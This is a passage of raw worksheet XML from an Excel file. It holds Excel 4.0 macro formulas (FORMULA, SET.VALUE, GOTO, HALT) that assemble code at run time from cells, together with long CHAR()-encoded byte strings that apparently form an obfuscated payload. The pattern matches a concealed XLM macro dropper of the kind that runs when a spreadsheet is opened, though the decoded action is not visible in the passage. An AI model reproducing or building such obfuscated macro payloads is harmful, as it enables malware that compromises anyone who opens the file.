(108)&amp;CHAR(102)&amp;CHAR(78)&amp;CHAR(79)&amp;CHAR(220)&amp;CHAR(125)&amp;CHAR(209)&amp;CHAR(242)&amp;CHAR(202)&amp;CHAR(180)&amp;CHAR(153)&amp;CHAR(249)&amp;CHAR(133)&amp;CHAR(252)&amp;CHAR(207)&amp;CHAR(93)&amp;CHAR(156)&amp;CHAR(121)&amp;CHAR(112)&amp;CHAR(250)&amp;CHAR(28)&amp;CHAR(14)&amp;CHAR(36)&amp;CHAR(184)&amp;CHAR(26)&amp;CHAR(182)&amp;CHAR(120)&amp;CHAR(5)&amp;CHAR(53)&amp;CHAR(204)&amp;CHAR(87)&amp;CHAR(70)&amp;CHAR(230)&amp;CHAR(182)&amp;CHAR(237)&amp;CHAR(34)&amp;CHAR(189)&amp;CHAR(75)&amp;CHAR(216)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(50)&amp;CHAR(102)&amp;CHAR(89)&amp;CHAR(8)&amp;CHAR(177)&amp;CHAR(105)&amp;CHAR(100)&amp;CHAR(165)&amp;CHAR(23)&amp;CHAR(105)&amp;CHAR(54)&amp;CHAR(61)&amp;CHAR(39)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(194)&amp;CHAR(202)&amp;CHAR(83)&amp;CHAR(211)&amp;CHAR(87)&amp;CHAR(179)&amp;CHAR(242)&amp;CHAR(163)&amp;CHAR(162)&amp;CHAR(138)&amp;CHAR(22)&amp;CHAR(169)&amp;CHAR(125)&amp;CHAR(47)&amp;CHAR(207)&amp;CHAR(180)&amp;CHAR(7)&amp;CHAR(82)&amp;CHAR(157)&amp;CHAR(23)&amp;CHAR(3)&amp;CHAR(177)&amp;CHAR(93)&amp;CHAR(111)&amp;CHAR(66)&amp;CHAR(142)&amp;CHAR(195)&amp;CHAR(10)&amp;CHAR(179)&amp;CHAR(242)&amp;CHAR(63)&amp;CHAR(159)&amp;CHAR(108)&amp;CHAR(148)&amp;CHAR(65)&amp;CHAR(30)&amp;CHAR(77)&amp;CHAR(200)&amp;CHAR(84)&amp;CHAR(4)&amp;CHAR(254)&amp;CHAR(179)&amp;CHAR(229)&amp;CHAR(229)&amp;CHAR(254)&amp;CHAR(10)&amp;CHAR(168)&amp;CHAR(13)&amp;CHAR(40)&amp;CHAR(171)&amp;CHAR(25)&amp;CHAR(82)&amp;CHAR(200)&amp;CHAR(23)&amp;CHAR(109)&amp;CHAR(137)&amp;CHAR(184)&amp;CHAR(67)&amp;CHAR(180)&amp;CHAR(106)&amp;CHAR(192)&amp;CHAR(21)&amp;CHAR(55)&amp;CHAR(105)&amp;CHAR(69)&amp;CHAR(187)&amp;CHAR(97)&amp;CHAR(92)&amp;CHAR(220)&amp;CHAR(48)&amp;CHAR(254)&amp;CHAR(112)&amp;CHAR(43)&amp;CHAR(172)&amp;CHAR(200)&amp;CHAR(96)&amp;CHAR(218)&amp;CHAR(39)&amp;CHAR(63)</f>
        <v>í_x0008_Ç[çÚ”
ÃÏÛÍ×_x0014_¨â¦SÎHmo‰»3­ãk¯jÇ†_x0007_Y²5FJJÐì±¯õER—*à®_x0017__x0006_Õ;D­µ„¬°·M_x000B_P­érÖJŠàÞ—ÚÂ_x0004_Y7_x0008_ý˜Ü_x0002_‘‘’‰˜xáo½¯g.Å“à¦†_x0016_íÊc~\æ)‹†H˜K“È *lfNOÜ}ÑòÊ´™ù…üÏ]œypú_x001C__x000E_$¸_x001A_¶x_x0005_5ÌWFæ¶í"½KØE&amp;2fY_x0008_±id¥_x0017_i6='!3ÂÊSÓW³ò£¢Š_x0016_©}/Ï´_x0007_R_x0017__x0003_±]oBŽÃ
³ò?Ÿl”A_x001E_MÈT_x0004_þ³ååþ
¨_x000D_(«_x0019_RÈ_x0017_m‰¸C´jÀ_x0015_7iE»a\Ü0þp+¬È`Ú'?</v>
      </c>
      <c r="DG39" t="str">
        <f>CHAR(235)&amp;CHAR(57)&amp;CHAR(18)&amp;CHAR(155)&amp;CHAR(94)&amp;CHAR(226)&amp;CHAR(238)&amp;CHAR(52)&amp;CHAR(211)&amp;CHAR(150)</f>
        <v>ë9_x0012_›^âî4Ó–</v>
      </c>
      <c r="DH39" t="s">
        <v>38</v>
      </c>
      <c r="DJ39">
        <f>Go()</f>
        <v>0</v>
      </c>
    </row>
    <row r="40" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE40" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH55&amp;DH55&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH76&amp;DH53&amp;DH67,DJ40)</f>
        <v>1</v>
      </c>
      <c r="DF40" t="str">
        <f>CHAR(92)&amp;CHAR(211)&amp;CHAR(98)&amp;CHAR(246)&amp;CHAR(86)&amp;CHAR(145)&amp;CHAR(69)&amp;CHAR(235)&amp;CHAR(83)&amp;CHAR(195)&amp;CHAR(247)&amp;CHAR(152)&amp;CHAR(235)&amp;CHAR(11)&amp;CHAR(108)&amp;CHAR(112)&amp;CHAR(121)&amp;CHAR(198)&amp;CHAR(211)&amp;CHAR(126)&amp;CHAR(228)&amp;CHAR(57)&amp;CHAR(198)&amp;CHAR(231)&amp;CHAR(135)&amp;CHAR(122)&amp;CHAR(26)&amp;CHAR(55)&amp;CHAR(149)&amp;CHAR(66)&amp;CHAR(30)&amp;CHAR(172)&amp;CHAR(214)&amp;CHAR(38)&amp;CHAR(33)&amp;CHAR(204)&amp;CHAR(196)&amp;CHAR(65)&amp;CHAR(147)&amp;CHAR(176)&amp;CHAR(247)&amp;CHAR(226)&amp;CHAR(50)&amp;CHAR(160)&amp;CHAR(8)&amp;CHAR(119)&amp;CHAR(194)&amp;CHAR(139)&amp;CHAR(26)&amp;CHAR(64)&amp;CHAR(11)&amp;CHAR(118)&amp;CHAR(195)&amp;CHAR(27)&amp;CHAR(205)&amp;CHAR(131)&amp;CHAR(228)&amp;CHAR(146)&amp;CHAR(39)&amp;CHAR(49)&amp;CHAR(197)&amp;CHAR(232)&amp;CHAR(122)&amp;CHAR(138)&amp;CHAR(174)&amp;CHAR(52)&amp;CHAR(47)&amp;CHAR(29)&amp;CHAR(250)&amp;CHAR(10)&amp;CHAR(40)&amp;CHAR(9)&amp;CHAR(224)&amp;CHAR(9)&amp;CHAR(148)&amp;CHAR(35)&amp;CHAR(205)&amp;CHAR(248)&amp;CHAR(251)&amp;CHAR(86)&amp;CHAR(89)&amp;CHAR(219)&amp;CHAR(36)&amp;CHAR(210)&amp;CHAR(109)&amp;CHAR(225)&amp;CHAR(113)&amp;CHAR(209)&amp;CHAR(123)&amp;CHAR(160)&amp;CHAR(123)&amp;CHAR(53)&amp;CHAR(13)&amp;CHAR(54)&amp;CHAR(24)&amp;CHAR(186)&amp;CHAR(45)&amp;CHAR(247)&amp;CHAR(113)&amp;CHAR(217)&amp;CHAR(79)&amp;CHAR(37)&amp;CHAR(98)&amp;CHAR(176)&amp;CHAR(154)&amp;CHAR(58)&amp;CHAR(239)&amp;CHAR(191)&amp;CHAR(225)&amp;CHAR(27)&amp;CHAR(21)&amp;CHAR(247)&amp;CHAR(243)&amp;CHAR(194)&amp;CHAR(37)&amp;CHAR(33)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(91)&amp;CHAR(9)&amp;CHAR(81)&amp;CHAR(41)&amp;CHAR(222)&amp;CHAR(49)&amp;CHAR(16)&amp;CHAR(217)&amp;CHAR(151)&amp;CHAR(42)&amp;CHAR(249)&amp;CHAR(235)&amp;CHAR(69)&amp;CHAR(92)&amp;CHAR(73)&amp;CHAR(208)&amp;CHAR(227)&amp;CHAR(53)&amp;CHAR(102)&amp;CHAR(239)&amp;CHAR(155)&amp;CHAR(5)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(91)&amp;CHAR(217)&amp;CHAR(119)&amp;CHAR(188)&amp;CHAR(138)&amp;CHAR(168)&amp;CHAR(23)&amp;CHAR(54)&amp;CHAR(40)&amp;CHAR(62)&amp;CHAR(188)&amp;CHAR(17)&amp;CHAR(252)&amp;CHAR(209)&amp;CHAR(105)&amp;CHAR(251)&amp;CHAR(181)&amp;CHAR(42)&amp;CHAR(78)&amp;CHAR(61)&amp;CHAR(87)&amp;CHAR(109)&amp;CHAR(34)&amp;CHAR(8)&amp;CHAR(183)&amp;CHAR(150)&amp;CHAR(193)&amp;CHAR(99)&amp;CHAR(166)&amp;CHAR(73)&amp;CHAR(225)&amp;CHAR(129)&amp;CHAR(28)&amp;CHAR(67)&amp;CHAR(34)&amp;CHAR(97)&amp;CHAR(56)&amp;CHAR(57)&amp;CHAR(251)&amp;CHAR(79)&amp;CHAR(26)&amp;CHAR(28)&amp;CHAR(159)&amp;CHAR(65)&amp;CHAR(227)&amp;CHAR(156)&amp;CHAR(11)&amp;CHAR(27)&amp;CHAR(195)&amp;CHAR(222)&amp;CHAR(234)&amp;CHAR(142)&amp;CHAR(238)&amp;CHAR(165)&amp;CHAR(115)&amp;CHAR(39)&amp;CHAR(187)&amp;CHAR(176)&amp;CHAR(141)&amp;CHAR(178)&amp;CHAR(189)&amp;CHAR(238)&amp;CHAR(132)&amp;CHAR(196)&amp;CHAR(228)&amp;CHAR(76)&amp;CHAR(106)&amp;CHAR(219)&amp;CHAR(228)&amp;CHAR(1)&amp;CHAR(79)&amp;CHAR(1)&amp;CHAR(222)&amp;CHAR(7)&amp;CHAR(76)&amp;CHAR(123)&amp;CHAR(51)&amp;CHAR(162)&amp;CHAR(176)&amp;CHAR(132)&amp;CHAR(10)&amp;CHAR(50)&amp;CHAR(93)&amp;CHAR(252)&amp;CHAR(236)&amp;CHAR(126)&amp;CHAR(154)&amp;CHAR(127)&amp;CHAR(161)&amp;CHAR(246)&amp;CHAR(178)&amp;CHAR(24)&amp;CHAR(170)&amp;CHAR(145)&amp;CHAR(81)&amp;CHAR(140)&amp;CHAR(228)&amp;CHAR(73)&amp;CHAR(247)&amp;CHAR(154)&amp;CHAR(203)&amp;CHAR(158)&amp;CHAR(246)&amp;CHAR(29)&amp;CHAR(65)&amp;CHAR(98)&amp;CHAR(135)&amp;CHAR(222)&amp;CHAR(27)&amp;CHAR(56)&amp;CHAR(184)&amp;CHAR(249)&amp;CHAR(174)</f>
        <v>\ÓböV‘EëSÃ÷˜ë_x000B_lpyÆÓ~ä9Æç‡z_x001A_7•B_x001E_¬Ö&amp;!ÌÄA“°÷â2 _x0008_wÂ‹_x001A_@_x000B_vÃ_x001B_Íƒä’'1ÅèzŠ®4/_x001D_ú
(	à	”#ÍøûVYÛ$ÒmáqÑ{ {5_x000D_6_x0018_º-÷qÙO%b°š:ï¿á_x001B__x0015_÷óÂ%!_x0003_Š[	Q)Þ1_x0010_Ù—*ùëE\IÐã5fï›_x0005_Ž_x000B_[Ùw¼Š¨_x0017_6(&gt;¼_x0011_üÑiûµ*N=Wm"_x0008_·–Ác¦Iá_x001C_C"a89ûO_x001A__x001C_ŸAãœ_x000B__x001B_ÃÞêŽî¥s'»°²½î„ÄäLjÛä_x0001_O_x0001_Þ_x0007_L{3¢°„
2]üì~š¡ö²_x0018_ª‘QŒäI÷šËžö_x001D_Ab‡Þ_x001B_8¸ù®</v>
      </c>
      <c r="DG40" t="str">
        <f>CHAR(62)&amp;CHAR(243)&amp;CHAR(133)&amp;CHAR(202)&amp;CHAR(65)&amp;CHAR(8)&amp;CHAR(187)&amp;CHAR(69)&amp;CHAR(30)&amp;CHAR(92)</f>
        <v>&gt;ó…ÊA_x0008_»E_x001E_\</v>
      </c>
      <c r="DH40" t="s">
        <v>39</v>
      </c>
      <c r="DJ40" t="b">
        <f>SET.VALUE($DJ$22,0)</f>
        <v>1</v>
      </c>
    </row>
    <row r="41" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE41" t="b">
        <f>FORMULA(DH65&amp;DH34&amp;DH27&amp;DH38&amp;DH46&amp;DH66&amp;DH67,DJ41)</f>
        <v>1</v>
      </c>
      <c r="DF41" t="str">
        <f>CHAR(157)&amp;CHAR(26)&amp;CHAR(15)&amp;CHAR(99)&amp;CHAR(151)&amp;CHAR(16)&amp;CHAR(215)&amp;CHAR(104)&amp;CHAR(164)&amp;CHAR(76)&amp;CHAR(214)&amp;CHAR(25)&amp;CHAR(53)&amp;CHAR(75)&amp;CHAR(49)&amp;CHAR(10)&amp;CHAR(235)&amp;CHAR(14)&amp;CHAR(198)&amp;CHAR(197)&amp;CHAR(59)&amp;CHAR(231)&amp;CHAR(149)&amp;CHAR(159)&amp;CHAR(239)&amp;CHAR(80)&amp;CHAR(188)&amp;CHAR(5)&amp;CHAR(161)&amp;CHAR(153)&amp;CHAR(139)&amp;CHAR(238)&amp;CHAR(41)&amp;CHAR(184)&amp;CHAR(36)&amp;CHAR(36)&amp;CHAR(211)&amp;CHAR(120)&amp;CHAR(183)&amp;CHAR(245)&amp;CHAR(81)&amp;CHAR(80)&amp;CHAR(44)&amp;CHAR(233)&amp;CHAR(239)&amp;CHAR(232)&amp;CHAR(128)&amp;CHAR(87)&amp;CHAR(247)&amp;CHAR(17)&amp;CHAR(149)&amp;CHAR(23)&amp;CHAR(217)&amp;CHAR(131)&amp;CHAR(68)&amp;CHAR(95)&amp;CHAR(116)&amp;CHAR(53)&amp;CHAR(208)&amp;CHAR(27)&amp;CHAR(122)&amp;CHAR(165)&amp;CHAR(36)&amp;CHAR(89)&amp;CHAR(53)&amp;CHAR(109)&amp;CHAR(131)&amp;CHAR(238)&amp;CHAR(203)&amp;CHAR(120)&amp;CHAR(163)&amp;CHAR(120)&amp;CHAR(53)&amp;CHAR(211)&amp;CHAR(111)&amp;CHAR(41)&amp;CHAR(114)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(164)&amp;CHAR(58)&amp;CHAR(60)&amp;CHAR(109)&amp;CHAR(1)&amp;CHAR(176)&amp;CHAR(31)&amp;CHAR(74)&amp;CHAR(188)&amp;CHAR(207)&amp;CHAR(128)&amp;CHAR(80)&amp;CHAR(240)&amp;CHAR(52)&amp;CHAR(206)&amp;CHAR(172)&amp;CHAR(129)&amp;CHAR(147)&amp;CHAR(204)&amp;CHAR(140)&amp;CHAR(217)&amp;CHAR(64)&amp;CHAR(245)&amp;CHAR(237)&amp;CHAR(38)&amp;CHAR(87)&amp;CHAR(247)&amp;CHAR(110)&amp;CHAR(207)&amp;CHAR(54)&amp;CHAR(212)&amp;CHAR(41)&amp;CHAR(100)&amp;CHAR(113)&amp;CHAR(238)&amp;CHAR(105)&amp;CHAR(105)&amp;CHAR(55)&amp;CHAR(61)&amp;CHAR(255)&amp;CHAR(72)&amp;CHAR(121)&amp;CHAR(25)&amp;CHAR(8)&amp;CHAR(91)&amp;CHAR(89)&amp;CHAR(244)&amp;CHAR(22)&amp;CHAR(226)&amp;CHAR(19)&amp;CHAR(65)&amp;CHAR(58)&amp;CHAR(87)&amp;CHAR(57)&amp;CHAR(238)&amp;CHAR(140)&amp;CHAR(45)&amp;CHAR(158)&amp;CHAR(68)&amp;CHAR(140)&amp;CHAR(39)&amp;CHAR(174)&amp;CHAR(95)&amp;CHAR(163)&amp;CHAR(93)&amp;CHAR(118)&amp;CHAR(165)&amp;CHAR(205)&amp;CHAR(128)&amp;CHAR(11)&amp;CHAR(83)&amp;CHAR(94)&amp;CHAR(150)&amp;CHAR(140)&amp;CHAR(74)&amp;CHAR(46)&amp;CHAR(164)&amp;CHAR(179)&amp;CHAR(82)&amp;CHAR(69)&amp;CHAR(184)&amp;CHAR(8)&amp;CHAR(15)&amp;CHAR(18)&amp;CHAR(83)&amp;CHAR(105)&amp;CHAR(211)&amp;CHAR(241)&amp;CHAR(95)&amp;CHAR(11)&amp;CHAR(156)&amp;CHAR(18)&amp;CHAR(119)&amp;CHAR(159)&amp;CHAR(244)&amp;CHAR(87)&amp;CHAR(21)&amp;CHAR(118)&amp;CHAR(207)&amp;CHAR(37)&amp;CHAR(207)&amp;CHAR(217)&amp;CHAR(138)&amp;CHAR(237)&amp;CHAR(219)&amp;CHAR(89)&amp;CHAR(11)&amp;CHAR(157)&amp;CHAR(155)&amp;CHAR(124)&amp;CHAR(61)&amp;CHAR(35)&amp;CHAR(233)&amp;CHAR(233)&amp;CHAR(75)&amp;CHAR(154)&amp;CHAR(171)&amp;CHAR(99)&amp;CHAR(47)&amp;CHAR(23)&amp;CHAR(19)&amp;CHAR(179)&amp;CHAR(152)&amp;CHAR(248)&amp;CHAR(112)&amp;CHAR(63)&amp;CHAR(117)&amp;CHAR(141)&amp;CHAR(51)&amp;CHAR(91)&amp;CHAR(198)&amp;CHAR(17)&amp;CHAR(216)&amp;CHAR(38)&amp;CHAR(65)&amp;CHAR(46)&amp;CHAR(253)&amp;CHAR(103)&amp;CHAR(139)&amp;CHAR(20)&amp;CHAR(9)&amp;CHAR(203)&amp;CHAR(212)&amp;CHAR(235)&amp;CHAR(7)&amp;CHAR(132)&amp;CHAR(52)&amp;CHAR(142)&amp;CHAR(113)&amp;CHAR(124)&amp;CHAR(183)&amp;CHAR(176)&amp;CHAR(93)&amp;CHAR(177)&amp;CHAR(217)&amp;CHAR(109)&amp;CHAR(192)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(230)&amp;CHAR(226)&amp;CHAR(131)&amp;CHAR(87)&amp;CHAR(6)&amp;CHAR(144)&amp;CHAR(193)&amp;CHAR(44)&amp;CHAR(196)&amp;CHAR(110)&amp;CHAR(187)&amp;CHAR(132)&amp;CHAR(30)&amp;CHAR(211)&amp;CHAR(232)&amp;CHAR(43)&amp;CHAR(111)</f>
        <v>_x001A__x000F_c—_x0010_×h¤LÖ_x0019_5K1
ë_x000E_ÆÅ;ç•ŸïP¼_x0005_¡™‹î)¸$$Óx·õQP,éïè€W÷_x0011_•_x0017_ÙƒD_t5Ð_x001B_z¥$Y5mƒîËx£x5Óo)rP¤:&lt;m_x0001_°_x001F_J¼Ï€Pð4Î¬“ÌŒÙ@õí&amp;W÷nÏ6Ô)dqîii7=ÿHy_x0019__x0008_[Yô_x0016_â_x0013_A:W9îŒ-žDŒ'®_£]v¥Í€_x000B_S^–ŒJ.¤³RE¸_x0008__x000F__x0012_SiÓñ__x000B_œ_x0012_wŸôW_x0015_vÏ%ÏÙŠíÛY_x000B_›|=#ééKš«c/_x0017__x0013_³˜øp?u3[Æ_x0011_Ø&amp;A.ýg‹_x0014_	ËÔë_x0007_„4Žq|·°]±ÙmÀ£0æâƒW_x0006_Á,Än»„_x001E_Óè+o</v>
      </c>
      <c r="DG41" t="str">
        <f>CHAR(169)&amp;CHAR(162)&amp;CHAR(170)&amp;CHAR(52)&amp;CHAR(30)&amp;CHAR(217)&amp;CHAR(58)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>©¢ª4_x001E_Ù:ÖÕ†</v>
      </c>
      <c r="DH41" t="s">
        <v>40</v>
      </c>
      <c r="DJ41" t="b">
        <f>HALT()</f>
        <v>1</v>
      </c>
    </row>
    <row r="42" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE42" t="b">
        <f>GOTO(DJ1)</f>
        <v>1</v>
      </c>
      <c r="DF42" t="str">
        <f>CHAR(183)&amp;CHAR(38)&amp;CHAR(145)&amp;CHAR(49)&amp;CHAR(123)&amp;CHAR(94)&amp;CHAR(22)&amp;CHAR(201)&amp;CHAR(158)&amp;CHAR(176)&amp;CHAR(182)&amp;CHAR(10)&amp;CHAR(168)&amp;CHAR(174)&amp;CHAR(207)&amp;CHAR(30)&amp;CHAR(30)&amp;CHAR(1)&amp;CHAR(122)&amp;CHAR(152)&amp;CHAR(156)&amp;CHAR(76)&amp;CHAR(189)&amp;CHAR(132)&amp;CHAR(231)&amp;CHAR(61)&amp;CHAR(115)&amp;CHAR(134)&amp;CHAR(98)&amp;CHAR(122)&amp;CHAR(254)&amp;CHAR(249)&amp;CHAR(164)&amp;CHAR(254)&amp;CHAR(155)&amp;CHAR(90)&amp;CHAR(225)&amp;CHAR(161)&amp;CHAR(4)&amp;CHAR(103)&amp;CHAR(68)&amp;CHAR(49)&amp;CHAR(174)&amp;CHAR(158)&amp;CHAR(34)&amp;CHAR(79)&amp;CHAR(211)&amp;CHAR(90)&amp;CHAR(52)&amp;CHAR(217)&amp;CHAR(30)&amp;CHAR(28)&amp;CHAR(223)&amp;CHAR(202)&amp;CHAR(54)&amp;CHAR(152)&amp;CHAR(152)&amp;CHAR(42)&amp;CHAR(135)&amp;CHAR(214)&amp;CHAR(58)&amp;CHAR(182)&amp;CHAR(89)&amp;CHAR(254)&amp;CHAR(129)&amp;CHAR(86)&amp;CHAR(163)&amp;CHAR(73)&amp;CHAR(79)&amp;CHAR(91)&amp;CHAR(217)&amp;CHAR(64)&amp;CHAR(155)&amp;CHAR(239)&amp;CHAR(219)&amp;CHAR(166)&amp;CHAR(11)&amp;CHAR(93)&amp;CHAR(247)&amp;CHAR(39)&amp;CHAR(43)&amp;CHAR(8)&amp;CHAR(207)&amp;CHAR(173)&amp;CHAR(97)&amp;CHAR(231)&amp;CHAR(165)&amp;CHAR(138)&amp;CHAR(159)&amp;CHAR(72)&amp;CHAR(87)&amp;CHAR(209)&amp;CHAR(40)&amp;CHAR(252)&amp;CHAR(10)&amp;CHAR(50)&amp;CHAR(95)&amp;CHAR(156)&amp;CHAR(206)&amp;CHAR(143)&amp;CHAR(25)&amp;CHAR(46)&amp;CHAR(241)&amp;CHAR(247)&amp;CHAR(63)&amp;CHAR(16)&amp;CHAR(177)&amp;CHAR(99)&amp;CHAR(44)&amp;CHAR(12)&amp;CHAR(57)&amp;CHAR(183)&amp;CHAR(49)&amp;CHAR(70)&amp;CHAR(204)&amp;CHAR(91)&amp;CHAR(226)&amp;CHAR(102)&amp;CHAR(182)&amp;CHAR(218)&amp;CHAR(144)&amp;CHAR(40)&amp;CHAR(103)&amp;CHAR(189)&amp;CHAR(125)&amp;CHAR(177)&amp;CHAR(70)&amp;CHAR(77)&amp;CHAR(134)&amp;CHAR(113)&amp;CHAR(181)&amp;CHAR(103)&amp;CHAR(5)&amp;CHAR(69)&amp;CHAR(94)&amp;CHAR(3)&amp;CHAR(147)&amp;CHAR(144)&amp;CHAR(159)&amp;CHAR(100)&amp;CHAR(179)&amp;CHAR(31)&amp;CHAR(160)&amp;CHAR(63)&amp;CHAR(216)&amp;CHAR(95)&amp;CHAR(63)&amp;CHAR(210)&amp;CHAR(51)&amp;CHAR(226)&amp;CHAR(102)&amp;CHAR(10)&amp;CHAR(86)&amp;CHAR(158)&amp;CHAR(110)&amp;CHAR(132)&amp;CHAR(84)&amp;CHAR(121)&amp;CHAR(100)&amp;CHAR(174)&amp;CHAR(2)&amp;CHAR(234)&amp;CHAR(251)&amp;CHAR(142)&amp;CHAR(77)&amp;CHAR(134)&amp;CHAR(23)&amp;CHAR(109)&amp;CHAR(233)&amp;CHAR(63)&amp;CHAR(47)&amp;CHAR(104)&amp;CHAR(171)&amp;CHAR(139)&amp;CHAR(195)&amp;CHAR(158)&amp;CHAR(184)&amp;CHAR(215)&amp;CHAR(245)&amp;CHAR(5)&amp;CHAR(145)&amp;CHAR(119)&amp;CHAR(21)&amp;CHAR(147)&amp;CHAR(215)&amp;CHAR(6)&amp;CHAR(223)&amp;CHAR(151)&amp;CHAR(53)&amp;CHAR(169)&amp;CHAR(16)&amp;CHAR(210)&amp;CHAR(183)&amp;CHAR(155)&amp;CHAR(15)&amp;CHAR(249)&amp;CHAR(177)&amp;CHAR(97)&amp;CHAR(225)&amp;CHAR(77)&amp;CHAR(95)&amp;CHAR(11)&amp;CHAR(222)&amp;CHAR(127)&amp;CHAR(102)&amp;CHAR(92)&amp;CHAR(228)&amp;CHAR(216)&amp;CHAR(198)&amp;CHAR(42)&amp;CHAR(7)&amp;CHAR(216)&amp;CHAR(200)&amp;CHAR(138)&amp;CHAR(84)&amp;CHAR(116)&amp;CHAR(142)&amp;CHAR(216)&amp;CHAR(226)&amp;CHAR(100)&amp;CHAR(96)&amp;CHAR(215)&amp;CHAR(113)&amp;CHAR(154)&amp;CHAR(155)&amp;CHAR(161)&amp;CHAR(99)&amp;CHAR(16)&amp;CHAR(134)&amp;CHAR(71)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(185)&amp;CHAR(72)&amp;CHAR(23)&amp;CHAR(233)&amp;CHAR(92)&amp;CHAR(86)&amp;CHAR(125)&amp;CHAR(57)&amp;CHAR(24)&amp;CHAR(127)&amp;CHAR(145)&amp;CHAR(131)&amp;CHAR(66)&amp;CHAR(86)&amp;CHAR(123)&amp;CHAR(180)&amp;CHAR(188)&amp;CHAR(191)&amp;CHAR(84)&amp;CHAR(234)&amp;CHAR(77)&amp;CHAR(130)&amp;CHAR(46)</f>
        <v>·&amp;‘1{^_x0016_Éž°¶
¨®Ï_x001E__x001E__x0001_z˜œL½„ç=s†bzþù¤þ›Zá¡_x0004_gD1®ž"OÓZ4Ù_x001E__x001C_ßÊ6˜˜*‡Ö:¶YþV£IO[Ù@›ïÛ¦_x000B_]÷'+_x0008_Ï­aç¥ŠŸHWÑ(ü
2_œÎ_x0019_.ñ÷?_x0010_±c,_x000C_9·1FÌ[âf¶Ú(g½}±FM†qµg_x0005_E^_x0003_“Ÿd³_x001F_ ?Ø_?Ò3âf
Vžn„Tyd®_x0002_êûŽM†_x0017_mé?/h«‹Ãž¸×õ_x0005_‘w_x0015_“×_x0006_ß—5©_x0010_Ò·›_x000F_ù±aáM__x000B_Þf\äØÆ*_x0007_ØÈŠTtŽØâd`×qš›¡c_x0010_†G_x0002_¹H_x0017_é\V}9_x0018_‘ƒBV{´¼¿TêM‚.</v>
      </c>
      <c r="DG42" t="str">
        <f>CHAR(9)&amp;CHAR(25)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(102)&amp;CHAR(242)&amp;CHAR(229)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v xml:space="preserve">	_x0019_×–fòå†Ê|</v>
      </c>
      <c r="DH42" t="s">
        <v>41</v>
      </c>
    </row>
    <row r="43" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DF43" t="str">
        <f>CHAR(44)&amp;CHAR(80)&amp;CHAR(150)&amp;CHAR(152)&amp;CHAR(46)&amp;CHAR(200)&amp;CHAR(20)&amp;CHAR(203)&amp;CHAR(104)&amp;CHAR(197)&amp;CHAR(17)&amp;CHAR(95)&amp;CHAR(57)&amp;CHAR(138)&amp;CHAR(253)&amp;CHAR(124)&amp;CHAR(61)&amp;CHAR(135)&amp;CHAR(241)&amp;CHAR(217)&amp;CHAR(175)&amp;CHAR(209)&amp;CHAR(65)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(42)&amp;CHAR(5)&amp;CHAR(139)&amp;CHAR(239)&amp;CHAR(41)&amp;CHAR(86)&amp;CHAR(42)&amp;CHAR(177)&amp;CHAR(110)&amp;CHAR(252)&amp;CHAR(115)&amp;CHAR(183)&amp;CHAR(173)&amp;CHAR(27)&amp;CHAR(99)&amp;CHAR(115)&amp;CHAR(35)&amp;CHAR(107)&amp;CHAR(222)&amp;CHAR(145)&amp;CHAR(76)&amp;CHAR(5)&amp;CHAR(77)&amp;CHAR(194)&amp;CHAR(200)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(28)&amp;CHAR(70)&amp;CHAR(43)&amp;CHAR(29)&amp;CHAR(126)&amp;CHAR(46)&amp;CHAR(160)&amp;CHAR(41)&amp;CHAR(44)&amp;CHAR(206)&amp;CHAR(234)&amp;CHAR(18)&amp;CHAR(34)&amp;CHAR(18)&amp;CHAR(151)&amp;CHAR(33)&amp;CHAR(102)&amp;CHAR(91)&amp;CHAR(180)&amp;CHAR(201)&amp;CHAR(76)&amp;CHAR(33)&amp;CHAR(169)&amp;CHAR(171)&amp;CHAR(16)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(241)&amp;CHAR(121)&amp;CHAR(223)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(100)&amp;CHAR(196)&amp;CHAR(20)&amp;CHAR(209)&amp;CHAR(180)&amp;CHAR(68)&amp;CHAR(58)&amp;CHAR(77)&amp;CHAR(154)&amp;CHAR(64)&amp;CHAR(143)&amp;CHAR(255)&amp;CHAR(84)&amp;CHAR(143)&amp;CHAR(12)&amp;CHAR(191)&amp;CHAR(109)&amp;CHAR(89)&amp;CHAR(82)&amp;CHAR(83)&amp;CHAR(152)&amp;CHAR(201)&amp;CHAR(44)&amp;CHAR(7)&amp;CHAR(146)&amp;CHAR(105)&amp;CHAR(8)&amp;CHAR(27)&amp;CHAR(66)&amp;CHAR(163)&amp;CHAR(223)&amp;CHAR(18)&amp;CHAR(224)&amp;CHAR(81)&amp;CHAR(72)&amp;CHAR(187)&amp;CHAR(77)&amp;CHAR(51)&amp;CHAR(40)&amp;CHAR(53)&amp;CHAR(66)&amp;CHAR(196)&amp;CHAR(154)&amp;CHAR(169)&amp;CHAR(107)&amp;CHAR(223)&amp;CHAR(247)&amp;CHAR(151)&amp;CHAR(203)&amp;CHAR(204)&amp;CHAR(143)&amp;CHAR(193)&amp;CHAR(34)&amp;CHAR(150)&amp;CHAR(104)&amp;CHAR(73)&amp;CHAR(82)&amp;CHAR(116)&amp;CHAR(130)&amp;CHAR(217)&amp;CHAR(10)&amp;CHAR(179)&amp;CHAR(137)&amp;CHAR(108)&amp;CHAR(209)&amp;CHAR(150)&amp;CHAR(30)&amp;CHAR(248)&amp;CHAR(61)&amp;CHAR(4)&amp;CHAR(55)&amp;CHAR(131)&amp;CHAR(210)&amp;CHAR(134)&amp;CHAR(122)&amp;CHAR(84)&amp;CHAR(37)&amp;CHAR(22)&amp;CHAR(166)&amp;CHAR(187